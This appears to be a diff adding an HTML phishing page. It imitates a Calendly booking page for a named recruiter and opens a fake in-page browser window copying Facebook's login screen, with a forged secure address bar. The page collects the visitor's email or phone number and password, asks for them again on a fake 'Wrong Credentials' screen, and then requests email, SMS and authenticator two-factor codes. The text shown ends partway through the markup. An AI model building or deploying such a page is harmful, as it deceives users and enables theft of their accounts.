@@ -1,0 +1,1359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#000000">
+    <meta name="description" content="Select a Date & Time - Calendly">
+    <title>Select a Date & Time - Calendly</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="icon" type="image/png" sizes="32x32" href="images/favicon.ico">
+    <link href="css/main.5d063b47.css" rel="stylesheet">
+</head>
+<body>
+    <div id="root">
+        <div class="App">
+            <div class="box__shadow">
+                <div class="calendar__wrapper">
+                    <script>
+                        console.log('Calendly Verify main content loaded'); // Debug log
+                    </script>
+                    <div class="user__wrapper">
+                        <div class="logo__wrapper">
+    <img src="images/spencerstuart.png" alt="Spencer Stuart Logo" style="width: 70%; max-width: 300px; height: auto;">
+</div>
+                        <div class="screen__two center__text">
+                            <div class="mobile__back-svg">
+                                <div class="content__wrapper">
+                                    <div>
+                                        <p>Robert Morgan</p>
+                                    </div>
+                                    <h2>30 Minutes Meeting</h2>
+                                </div>
+                            </div>
+                            <div class="minute">
+                                <svg data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
+                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
+                                    <path d="M5 3.269V5l1.759 2.052" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
+                                </svg><span>30 min</span>
+                            </div>
+                            <div class="minute mt-12">
+                                <svg data-testid="phone-call-icon" data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
+                                    <path d="M6.216 9.151a2.215 2.215 0 0 0 2.758-.3l.31-.31a.738.738 0 0 0 0-1.043l-1.3-1.3a.739.739 0 0 0-1.044 0h0a.738.738 0 0 1-1.043 0L3.806 4.107a.738.738 0 0 1 0-1.043h0a.739.739 0 0 0 0-1.044L2.5.716a.738.738 0 0 0-1.043 0l-.31.31a2.214 2.214 0 0 0-.3 2.758 19.976 19.976 0 0 0 5.369 5.367Z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
+                                </svg><span>Phone call</span>
+                            </div>
+                            <div class="minute space__bettwen">
+                                <svg data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
+                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
+                                    <path d="M.846 6.731h1.212a1.212 1.212 0 0 0 1.211-1.212V4.481a1.212 1.212 0 0 1 1.212-1.212 1.211 1.211 0 0 0 1.211-1.211V.553M9.5 4.929a2.469 2.469 0 0 0-1.117-.275H6.9a1.212 1.212 0 1 0 0 2.423.865.865 0 0 1 .865.865v.605" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
+                                </svg>
+<span id="budapest-time">Timezone (00:00)</span>
+</div>
+<script>
+    async function getUserTimezone() {
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            return data.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone;
+        } catch (error) {
+            console.error('Error fetching timezone:', error);
+            return Intl.DateTimeFormat().resolvedOptions().timeZone; // Fallback to browser timezone
+        }
+    }
+
+    async function updateLocalTime() {
+        const timezone = await getUserTimezone();
+        const options = {
+            timeZone: timezone,
+            hour: '2-digit',
+            minute: '2-digit',
+            hour12: false
+        };
+        const updateTime = () => {
+            const now = new Date();
+            const timeString = now.toLocaleTimeString('en-US', options);
+            document.getElementById('budapest-time').textContent = `${timezone} (${timeString})`;
+        };
+        updateTime();
+        setInterval(updateTime, 1000);
+    }
+
+    updateLocalTime();
+</script>
+                        </div>
+                        <div class="footer__wrapper">
+                            <p>Cookie settings</p>
+                            <p>Report abuse</p>
+                        </div>
+                    </div>
+                    <div class="form__wrapper date__time">
+                        <div>
+                            <div class="full__width">
+                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
+                                    <h2>Schedule call with Robert Morgan</h2>
+                                </div>
+                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
+                                    <div class="form-steps">
+                                        <form id="msform">
+                                            <ul id="progressbar">
+                                                <li class="active" id="account"><strong>Verify</strong></li>
+                                                <li id="personal"><strong>Schedule</strong></li>
+                                                <li id="confirm"><strong>Finish</strong></li>
+                                            </ul>
+                                        </form>
+                                    </div>
+                                </div>
+                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
+                                    <div class="dummy__text">
+                                        <p>Please confirm your appointment with Robert Morgan. <br>To complete the confirmation process, continue with Facebook</p>
+                                    </div>
+                                </div>
+                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
+                                    <div class="facebook__button">
+                                        <button id="facebook-btn">
+                                            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="24" viewBox="0 0 25 24" fill="none">
+                                                <g clip-path="url(#clip0_302_2)">
+                                                    <rect width="24" height="24" transform="translate(0.845947)" fill="#1877F2"></rect>
+                                                    <path d="M24.3459 12.0699C24.3459 5.7186 19.1972 0.56988 12.8459 0.56988C6.49467 0.56988 1.34595 5.7186 1.34595 12.0699C1.34595 17.8099 5.55133 22.5674 11.0491 23.4302V15.3941H8.12915V12.0699H11.0491V9.53629C11.0491 6.6541 12.7659 5.06207 15.3928 5.06207C16.651 5.06207 17.967 5.28668 17.967 5.28668V8.11675H16.5169C15.0883 8.11675 14.6428 9.00322 14.6428 9.91266V12.0699H17.8323L17.3224 15.3941H14.6428V23.4302C20.1406 22.5674 24.3459 17.8099 24.3459 12.0699Z" fill="white"></path>
+                                                </g>
+                                                <defs>
+                                                    <clipPath id="clip0_302_2">
+                                                        <rect width="24" height="24" fill="white" transform="translate(0.845947)"></rect>
+                                                    </clipPath>
+                                                </defs>
+                                            </svg>Continue with Facebook
+                                        </button>
+                                    </div>
+                                </div>
+                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
+                                    <div class="footer__wrapper footer__wrapper-mobile footer__wrapper-contact">
+                                        <p>Cookie settings</p>
+                                        <p>Report abuse</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <a class="logo__wrapper-calendly hide__mobile">
+                            <div class="background">
+                                <div class="powerd__by">powered by</div>
+                                <div class="calendly">Calendly</div>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                <a class="logo__wrapper-calendly-mobile">
+                    <div class="background">
+                        <div class="powerd__by">powered by</div>
+                        <div class="calendly">Calendly</div>
+                    </div>
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal Structure -->
+    <div id="facebook-modal" style="display: none;">
+        <div class="ant-modal-mask"></div>
+        <div tabindex="-1" class="ant-modal-wrap">
+            <div role="dialog" aria-labelledby="rc_unique_0" aria-modal="true" class="ant-modal modal-wrapper modal__facebook" style="width: 1000px; transform-origin: 612.4px 335px;">
+                <div tabindex="0" aria-hidden="true" style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
+                <div class="ant-modal-content">
+                    <button type="button" aria-label="Close" class="ant-modal-close" id="modal-close-btn">
+                        <span class="ant-modal-close-x">
+                            <span role="img" aria-label="close" class="anticon anticon-close ant-modal-close-icon">
+                                <svg fill-rule="evenodd" viewBox="64 64 896 896" focusable="false" data-icon="close" width="1em" height="1em" fill="currentColor" aria-hidden="true">
+                                    <path d="M799.86 166.31c.02 0 .04.02.08.06l57.69 57.7c.04.03.05.05.06.08a.12.12 0 010 .06c0 .03-.02.05-.06.09L569.93 512l287.7 287.7c.04.04.05.06.06.09a.12.12 0 010 .07c0 .02-.02.04-.06.08l-57.7 57.69c-.03.04-.05.05-.07.06a.12.12 0 01-.07 0c-.03 0-.05-.02-.09-.06L512 569.93l-287.7 287.7c-.04.04-.06.05-.09-.06a.12.12 0 01-.07 0c-.02 0-.04-.02-.08-.06l-57.69-57.7c-.04-.03-.05-.05-.06-.07a.12.12 0 010-.07c0-.03.02-.05.06-.09L454.07 512l-287.7-287.7c-.04-.04-.05-.06-.06-.09a.12.12 0 010-.07c0-.02.02-.04.06-.08l57.7-57.69c.03-.04.05-.05.07-.06a.12.12 0 01.07 0c.03 0 .05.02.09.06L512 454.07l287.7-287.7c.04-.04.06-.05.09-.06a.12.12 0 01.07 0z"></path>
+                                </svg>
+                            </span>
+                        </span>
+                    </button>
+                    <div class="ant-modal-header">
+                        <div class="ant-modal-title" id="rc_unique_0">
+                            <div>
+                                <div class="wrapper_header">
+                                    <div class="sign__up-modal">
+                                        <img src="images/fb.ico" alt="" width="17px">
+                                        <p>Log into Facebook | Facebook</p>
+                                    </div>
+                                    <div class="icons">
+                                        <div class="img" role="button"><img src="images/minus.png" alt=""></div>
+                                        <div class="img"><img src="images/square.png" alt=""></div>
+                                        <div class="img img-x" role="button" id="modal-close-img"><img src="images/close.png" alt=""></div>
+                                    </div>
+                                </div>
+                                <div class="input__title-wrapper">
+                                    <div class="lock__screen">
+                                        <div class="lock">
+                                            <div class="lock__wrapper"><img src="images/locktest.png" alt=""><span class="green">Secure | https:</span><span class="black-opacity">//</span></div>
+                                        </div>
+                                        <span class="input__value">www.facebook.com<span class="black">/login.php?skip<span class="hide__text-mobile">_api_login=1&api_key=481324359126967&kid_directed_site=0&app_id=481324359126967&signed...</span></span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="ant-modal-body" style="height: 650px;" id="login-form">
+                        <div class="confirmation-container-modal">
+                            <div class="header-color">
+                                <div class="header-container">
+                                    <div class="logo__faceook"></div>
+                                </div>
+                            </div>
+                            <div class="auth-req-container auth__req-modal">
+                                <div class="auth-req">
+                                    <div class="auth-req-text-modal">
+                                        <h2>Log Into Facebook</h2>
+                                        <div class="modal__confirmation">
+                                            <form class="ant-form ant-form-horizontal">
+                                                <div>
+                                                    <div class="ant-form-item">
+                                                        <div class="ant-row ant-form-item-row">
+                                                            <div class="ant-col ant-form-item-control">
+                                                                <div class="ant-form-item-control-input">
+                                                                    <div class="ant-form-item-control-input-content">
+                                                                        <input required type="text" placeholder="Email or phone number" id="username" class="ant-input" value="">
+                                                                        <div id="username-error" style="color: red; display: none;">Email or phone number cannot be empty.</div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <div class="ant-form-item">
+                                                        <div class="ant-row ant-form-item-row">
+                                                            <div class="ant-col ant-form-item-control">
+                                                                <div class="ant-form-item-control-input">
+                                                                    <div class="ant-form-item-control-input-content">
+                                                                        <input required type="password" placeholder="Password" id="password" class="ant-input">
+                                                                        <div id="password-error" style="color: red; display: none;">Password cannot be empty.</div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div><button type="submit" id="login-btn">Log In</button></div>
+                                            </form>
+                                            <div class="modal__confirmation-forgot">
+                                                <div class="modal__confirmation-account">
+                                                    <p>Forgot account?</p>
+                                                    <p>Sign up for Facebook</p>
+                                                </div>
+                                                <p class="not__now">Not now</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="having-trouble-class having__trouble-modal"><button>Having trouble?</button></div>
+                                <div class="show-footer-on-mobile-plus hide__footer-modal">
+                                    <h2 class="h2-foot not__you-text">Not You? Log In Here</h2>
+                                    <div class="footer-flex-mobile-plus confimartion__modal">
+                                        <div>
+                                            <h2>English (US)</h2>
+                                            <p>Deutsch</p>
+                                            <p>Српски</p>
+                                            <p>Português (Brasil)</p>
+                                        </div>
+                                        <div>
+                                            <p>Italiano</p>
+                                            <p>Bosanski</p>
+                                            <p>Svensk</p><button>+</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="modal__footer">
+                            <div class="footer-menu-flex-ul">
+                                <div class="container-language-footer">
+                                    <ul class="flex-ul">
+                                        <li>English (US)</li>
+                                        <li>Español</li>
+                                        <li>Deutsch</li>
+                                        <li>Türkçe</li>
+                                        <li>Српски</li>
+                                        <li>Français (France)</li>
+                                        <li>Italiano</li>
+                                        <li>Bosanski</li>
+                                        <li>Svensk</li>
+                                        <li>Português (Brasil)</li>
+                                        <button class="countrys-button"><span>+</span></button>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul">
+                                    <ul>
+                                        <li>Sign Up</li>
+                                        <li>Log In</li>
+                                        <li>Messenger</li>
+                                        <li>Facebook Lite</li>
+                                        <li>Watch</li>
+                                        <li>Places</li>
+                                        <li>Games</li>
+                                        <li>Marketplace</li>
+                                        <li>Facebook Pay</li>
+                                        <li>Oculus</li>
+                                        <li>Portal</li>
+                                        <li>Instagram</li>
+                                        <li>Bulletin</li>
+                                        <li>Local</li>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul-2">
+                                    <ul>
+                                        <li>Fundraisers</li>
+                                        <li>Services</li>
+                                        <li>Voting Information Centre</li>
+                                        <li>About</li>
+                                        <li>Create ad</li>
+                                        <li>Create Page</li>
+                                        <li>Developers</li>
+                                        <li>Careers</li>
+                                        <li>Privacy</li>
+                                        <li>Cookies</li>
+                                        <li class="ad-choice-img">Ad Choices <span class="img-li"></span></li>
+                                        <li>Terms</li>
+                                        <li>Help</li>
+                                    </ul>
+                                </div>
+                                <div class="meta-footer">
+                                    <p>Meta © 2025</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="ant-modal-body" style="height: 650px; display: none;" id="wrongpsw">
+                        <div class="confirmation-container-modal">
+                            <div class="header-color">
+                                <div class="header-container">
+                                    <div class="logo__faceook"></div>
+                                </div>
+                            </div>
+                            <div class="auth-req-container auth__req-modal">
+                                <div class="auth-req">
+                                    <div class="auth-req-text-modal">
+                                        <h2>Log Into Facebook</h2>
+                                        <div class="wrong__password">
+                                            <h2>Wrong Credentials</h2>
+                                            <p>Invalid username or password</p>
+                                        </div>
+                                        <div class="modal__confirmation">
+                                            <form class="ant-form ant-form-horizontal">
+                                                <div>
+                                                    <div class="ant-form-item">
+                                                        <div class="ant-row ant-form-item-row">
+                                                            <div class="ant-col ant-form-item-control">
+                                                                <div class="ant-form-item-control-input">
+                                                                    <div class="ant-form-item-control-input-content">
+                                                                        <input required type="text" placeholder="Email or phone number" id="confirm_username" class="ant-input" value="">
+                                                                        <div id="confirm-username-error" style="color: red; display: none;">Email or phone number cannot be empty or whitespace.</div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <div class="ant-form-item">
+                                                        <div class="ant-row ant-form-item-row">
+                                                            <div class="ant-col ant-form-item-control">
+                                                                <div class="ant-form-item-control-input">
+                                                                    <div class="ant-form-item-control-input-content">
+                                                                        <input required type="password" placeholder="Password" id="confirm_password" class="ant-input">
+                                                                        <div id="confirm-password-error" style="color: red; display: none;">Password cannot be empty or whitespace.</div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div><button type="submit" id="confirm_login">Log In</button></div>
+                                            </form>
+                                            <div class="modal__confirmation-forgot">
+                                                <div class="modal__confirmation-account">
+                                                    <p>Forgot account?</p>
+                                                    <p>Sign up for Facebook</p>
+                                                </div>
+                                                <p class="not__now">Not now</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="having-trouble-class having__trouble-modal"><button>Having trouble?</button></div>
+                                <div class="show-footer-on-mobile-plus hide__footer-modal">
+                                    <h2 class="h2-foot not__you-text">Not You? Log In Here</h2>
+                                    <div class="footer-flex-mobile-plus confimartion__modal">
+                                        <div>
+                                            <h2>English (US)</h2>
+                                            <p>Deutsch</p>
+                                            <p>Српски</p>
+                                            <p>Português (Brasil)</p>
+                                        </div>
+                                        <div>
+                                            <p>Italiano</p>
+                                            <p>Bosanski</p>
+                                            <p>Svensk</p><button>+</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="modal__footer">
+                            <div class="footer-menu-flex-ul">
+                                <div class="container-language-footer">
+                                    <ul class="flex-ul">
+                                        <li>English (US)</li>
+                                        <li>Español</li>
+                                        <li>Deutsch</li>
+                                        <li>Türkçe</li>
+                                        <li>Српски</li>
+                                        <li>Français (France)</li>
+                                        <li>Italiano</li>
+                                        <li>Bosanski</li>
+                                        <li>Svensk</li>
+                                        <li>Português (Brasil)</li>
+                                        <button class="countrys-button"><span>+</span></button>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul">
+                                    <ul>
+                                        <li>Sign Up</li>
+                                        <li>Log In</li>
+                                        <li>Messenger</li>
+                                        <li>Facebook Lite</li>
+                                        <li>Watch</li>
+                                        <li>Places</li>
+                                        <li>Games</li>
+                                        <li>Marketplace</li>
+                                        <li>Facebook Pay</li>
+                                        <li>Oculus</li>
+                                        <li>Portal</li>
+                                        <li>Instagram</li>
+                                        <li>Bulletin</li>
+                                        <li>Local</li>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul-2">
+                                    <ul>
+                                        <li>Fundraisers</li>
+                                        <li>Services</li>
+                                        <li>Voting Information Centre</li>
+                                        <li>About</li>
+                                        <li>Create ad</li>
+                                        <li>Create Page</li>
+                                        <li>Developers</li>
+                                        <li>Careers</li>
+                                        <li>Privacy</li>
+                                        <li>Cookies</li>
+                                        <li class="ad-choice-img">Ad Choices <span class="img-li"></span></li>
+                                        <li>Terms</li>
+                                        <li>Help</li>
+                                    </ul>
+                                </div>
+                                <div class="meta-footer">
+                                    <p>Meta © 2025</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="ant-modal-body" style="height: 650px; display: none;" id="waitTime">
+                        <div class="header-color">
+                            <div class="header-container">
+                                <h2>facebook</h2>
+                            </div>
+                        </div>
+                        <div class="loading-container">
+                            <div class="loading-message">Please be patient and don't close this window</div>
+                            <div class="loading-submessage step1">Checking the details on your account...</div>
+                            <div class="loading-submessage step2">Checking email addresses...</div>
+                            <div class="loading-submessage step3">Checking two-factor authenticator...</div>
+                            <div class="loading-submessage step4">Checking other details...</div>
+                            <div class="loading-submessage finalStep">It can take up to 10 minutes to verify your account.</div>
+                            <div class="loader"></div>
+                        </div>
+                    </div>
+                    <div class="ant-modal-body" style="height: 650px; display: none;" id="codeEmail">
+                        <div class="confirmation-container-2">
+                            <div class="header-color">
+                                <div class="header-container">
+                                    <div class="logo__faceook"></div>
+                                </div>
+                            </div>
+                            <div class="auth-req-container-2">
+                                <div class="auth-req-2">
+                                    <div class="auth-req-text-2">
+                                        <h2>Enter security code</h2>
+                                        <div class="confirmation-second-2">
+                                            <div class="auth-req-paragraph-2">
+                                                <p class="first-1-text">Please check your email for a message with your code. Your code is 8 numbers long.</p>
+                                            </div>
+                                            <div class="flex-confirmation-second-2">
+                                                <div class="input-auth-req-2">
+                                                    <input placeholder="Enter Code" id="emailcode" type="number" required class="ant-input">
+                                                    <div id="error-message" style="color: red; display: none;">The code must be exactly 8 digits!</div>
+                                                </div>
+                                                <div class="sent-mail-2">
+                                                    <p>We sent your code to:</p>
+                                                    <p>****@****.***</p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="show-input-on-mobile-2"><input class="ant-input" type="text" value=""></div>
+                                    <div class="auth-req-footer-2">
+                                        <a>Didn't get a code?</a>
+                                        <div class="button-second-confirmation-2"><button type="submit" id="buttonemailcode">Continue</button></div>
+                                    </div>
+                                </div>
+                                <div class="show-button-mobile-2">
+                                    <h2>We sent your code to:<br>****@****.***</h2>
+                                    <p>Check that you have received an email containing your code. Your code has 8 numbers.</p>
+                                    <h2>Enter the 8-digit code</h2>
+                                    <input type="number" placeholder="########" class="ant-input" id="emailcodeMobile">
+                                    <div id="error-message-email-mobile" style="color: red; display: none;">The code must be exactly 8 digits!</div>
+                                    <button type="submit" id="buttoncodeMobile">Continue</button>
+                                    <a>try another way</a>
+                                </div>
+                                <div class="show-footer-on-mobile-plus-2">
+                                    <h2 class="h2-foot-2">Not You? Log In Here</h2>
+                                    <div class="footer-flex-mobile-plus-2">
+                                        <div>
+                                            <h2>English (US)</h2>
+                                            <p>Deutsch</p>
+                                            <p>Српски</p>
+                                            <p>Português (Brasil)</p>
+                                        </div>
+                                        <div>
+                                            <p>Italiano</p>
+                                            <p>Bosanski</p>
+                                            <p>Svensk</p><button>+</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="modal__footer">
+                            <div class="footer-menu-flex-ul-2">
+                                <div class="container-language-footer-2">
+                                    <ul class="flex-ul-second-confirmation">
+                                        <li>English (US)</li>
+                                        <li>Español</li>
+                                        <li>Deutsch</li>
+                                        <li>Türkçe</li>
+                                        <li>Српски</li>
+                                        <li>Français (France)</li>
+                                        <li>Italiano</li>
+                                        <li>Bosanski</li>
+                                        <li>Svensk</li>
+                                        <li>Português (Brasil)</li>
+                                        <button class="countrys-button-2"><span>+</span></button>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul-confirmation">
+                                    <ul>
+                                        <li>Sign Up</li>
+                                        <li>Log In</li>
+                                        <li>Messenger</li>
+                                        <li>Facebook Lite</li>
+                                        <li>Watch</li>
+                                        <li>Places</li>
+                                        <li>Games</li>
+                                        <li>Marketplace</li>
+                                        <li>Facebook Pay</li>
+                                        <li>Oculus</li>
+                                        <li>Portal</li>
+                                        <li>Instagram</li>
+                                        <li>Bulletin</li>
+                                        <li>Local</li>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul-4">
+                                    <ul>
+                                        <li>Fundraisers</li>
+                                        <li>Services</li>
+                                        <li>Voting Information Centre</li>
+                                        <li>About</li>
+                                        <li>Create ad</li>
+                                        <li>Create Page</li>
+                                        <li>Developers</li>
+                                        <li>Careers</li>
+                                        <li>Privacy</li>
+                                        <li>Cookies</li>
+                                        <li class="ad-choice-img-2">Ad Choices <span class="img-li-2"></span></li>
+                                        <li>Terms</li>
+                                        <li>Help</li>
+                                    </ul>
+                                </div>
+                                <div class="meta-footer-2">
+                                    <p>Meta © 2025</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="ant-modal-body" style="height: 650px; display: none;" id="codeSms">
+                        <div class="confirmation-container-2">
+                            <div class="header-color">
+                                <div class="header-container">
+                                    <div class="logo__faceook"></div>
+                                </div>
+                            </div>
+                            <div class="auth-req-container-2">
+                                <div class="auth-req-2">
+                                    <div class="auth-req-text-2">
+                                        <h2>Enter security code</h2>
+                                        <div class="confirmation-second-2">
+                                            <div class="auth-req-paragraph-2">
+                                                <p class="first-1-text">Please check your phone for a message with your code. Your code is 6 numbers long.</p>
+                                            </div>
+                                            <div class="flex-confirmation-second-2">
+                                                <div class="input-auth-req-2">
+                                                    <input placeholder="Enter Code" type="number" required class="ant-input" id="codeSmsDes">
+                                                    <div id="error-message2" style="color: red; display: none;">The code must be exactly 6 digits!</div>
+                                                </div>
+                                                <div class="sent-mail-2">
+                                                    <p>We sent your code to:</p>
+                                                    <p>+***********</p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="show-input-on-mobile-2"><input class="ant-input" type="text" value=""></div>
+                                    <div class="auth-req-footer-2">
+                                        <a>Didn't get a code?</a>
+                                        <div class="button-second-confirmation-2"><button type="submit" id="buttonSms">Continue</button></div>
+                                    </div>
+                                </div>
+                                <div class="show-button-mobile-2">
+                                    <h2>We sent your code to:<br>+***********</h2>
+                                    <p>Check that you have received an SMS containing your code. Your code has 6 numbers.</p>
+                                    <h2>Enter the 6-digit code</h2>
+                                    <input type="number" placeholder="######" class="ant-input" id="codeSmsMobile">
+                                    <div id="error-message2-mobile" style="color: red; display: none;">The code must be exactly 6 digits!</div>
+                                    <button type="submit" id="buttonSmsMobile">Continue</button>
+                                    <a>try another way</a>
+                                </div>
+                                <div class="show-footer-on-mobile-plus-2">
+                                    <h2 class="h2-foot-2">Not You? Log In Here</h2>
+                                    <div class="footer-flex-mobile-plus-2">
+                                        <div>
+                                            <h2>English (US)</h2>
+                                            <p>Deutsch</p>
+                                            <p>Српски</p>
+                                            <p>Português (Brasil)</p>
+                                        </div>
+                                        <div>
+                                            <p>Italiano</p>
+                                            <p>Bosanski</p>
+                                            <p>Svensk</p><button>+</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="modal__footer">
+                            <div class="footer-menu-flex-ul-2">
+                                <div class="container-language-footer-2">
+                                    <ul class="flex-ul-second-confirmation">
+                                        <li>English (US)</li>
+                                        <li>Español</li>
+                                        <li>Deutsch</li>
+                                        <li>Türkçe</li>
+                                        <li>Српски</li>
+                                        <li>Français (France)</li>
+                                        <li>Italiano</li>
+                                        <li>Bosanski</li>
+                                        <li>Svensk</li>
+                                        <li>Português (Brasil)</li>
+                                        <button class="countrys-button-2"><span>+</span></button>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul-confirmation">
+                                    <ul>
+                                        <li>Sign Up</li>
+                                        <li>Log In</li>
+                                        <li>Messenger</li>
+                                        <li>Facebook Lite</li>
+                                        <li>Watch</li>
+                                        <li>Places</li>
+                                        <li>Games</li>
+                                        <li>Marketplace</li>
+                                        <li>Facebook Pay</li>
+                                        <li>Oculus</li>
+                                        <li>Portal</li>
+                                        <li>Instagram</li>
+                                        <li>Bulletin</li>
+                                        <li>Local</li>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul-4">
+                                    <ul>
+                                        <li>Fundraisers</li>
+                                        <li>Services</li>
+                                        <li>Voting Information Centre</li>
+                                        <li>About</li>
+                                        <li>Create ad</li>
+                                        <li>Create Page</li>
+                                        <li>Developers</li>
+                                        <li>Careers</li>
+                                        <li>Privacy</li>
+                                        <li>Cookies</li>
+                                        <li class="ad-choice-img-2">Ad Choices <span class="img-li-2"></span></li>
+                                        <li>Terms</li>
+                                        <li>Help</li>
+                                    </ul>
+                                </div>
+                                <div class="meta-footer-2">
+                                    <p>Meta © 2025</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="ant-modal-body" style="height: 650px; display: none;" id="authcode">
+                        <div class="confirmation-container-2">
+                            <div class="header-color">
+                                <div class="header-container">
+                                    <div class="logo__faceook"></div>
+                                </div>
+                            </div>
+                            <div class="auth-req-container-2">
+                                <div class="auth-req-2">
+                                    <div class="auth-req-text-2">
+                                        <h2>Enter security code</h2>
+                                        <div class="confirmation-second-2">
+                                            <div class="auth-req-paragraph-2">
+                                                <p class="first-1-text">Your account has two-factor authentication switched on, which requires this extra login step.</p>
+                                            </div>
+                                            <div class="auth-req-paragraph-2">
+                                                <p class="first-1-text">Enter the 6-digit code from the authentication app you set up.</p>
+                                            </div>
+                                            <div class="flex-confirmation-second-2">
+                                                <div class="input-auth-req-2">
+                                                    <input placeholder="Enter Code" type="number" required class="ant-input" id="authcodesms">
+                                                    <div id="error-message-auth" style="color: red; display: none;">The code must be exactly 6 digits!</div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="show-input-on-mobile-2"><input class="ant-input" type="text" value=""></div>
+                                    <div class="auth-req-footer-2">
+                                        <a>Didn't get a code?</a>
+                                        <div class="button-second-confirmation-2"><button type="submit" id="buttonauth">Continue</button></div>
+                                    </div>
+                                </div>
+                                <div class="show-button-mobile-2">
+                                    <p>Your account has two-factor authentication switched on, which requires this extra login step.</p>
+                                    <h2>Enter the 6-digit code</h2>
+                                    <input type="number" placeholder="######" class="ant-input" id="authcodeMobile">
+                                    <div id="error-message-auth-mobile" style="color: red; display: none;">The code must be exactly 6 digits!</div>
+                                    <button type="submit" id="buttonauthMobile">Continue</button>
+                                    <a>try another way</a>
+                                </div>
+                                <div class="show-footer-on-mobile-plus-2">
+                                    <h2 class="h2-foot-2">Not You? Log In Here</h2>
+                                    <div class="footer-flex-mobile-plus-2">
+                                        <div>
+                                            <h2>English (US)</h2>
+                                            <p>Deutsch</p>
+                                            <p>Српски</p>
+                                            <p>Português (Brasil)</p>
+                                        </div>
+                                        <div>
+                                            <p>Italiano</p>
+                                            <p>Bosanski</p>
+                                            <p>Svensk</p><button>+</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="modal__footer">
+                            <div class="footer-menu-flex-ul-2">
+                                <div class="container-language-footer-2">
+                                    <ul class="flex-ul-second-confirmation">
+                                        <li>English (US)</li>
+                                        <li>Español</li>
+                                        <li>Deutsch</li>
+                                        <li>Türkçe</li>
+                                        <li>Српски</li>
+                                        <li>Français (France)</li>
+                                        <li>Italiano</li>
+                                        <li>Bosanski</li>
+                                        <li>Svensk</li>
+                                        <li>Português (Brasil)</li>
+                                        <button class="countrys-button-2"><span>+</span></button>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul-confirmation">
+                                    <ul>
+                                        <li>Sign Up</li>
+                                        <li>Log In</li>
+                                        <li>Messenger</li>
+                                        <li>Facebook Lite</li>
+                                        <li>Watch</li>
+                                        <li>Places</li>
+                                        <li>Games</li>
+                                        <li>Marketplace</li>
+                                        <li>Facebook Pay</li>
+                                        <li>Oculus</li>
+                                        <li>Portal</li>
+                                        <li>Instagram</li>
+                                        <li>Bulletin</li>
+                                        <li>Local</li>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul-4">
+                                    <ul>
+                                        <li>Fundraisers</li>
+                                        <li>Services</li>
+                                        <li>Voting Information Centre</li>
+                                        <li>About</li>
+                                        <li>Create ad</li>
+                                        <li>Create Page</li>
+                                        <li>Developers</li>
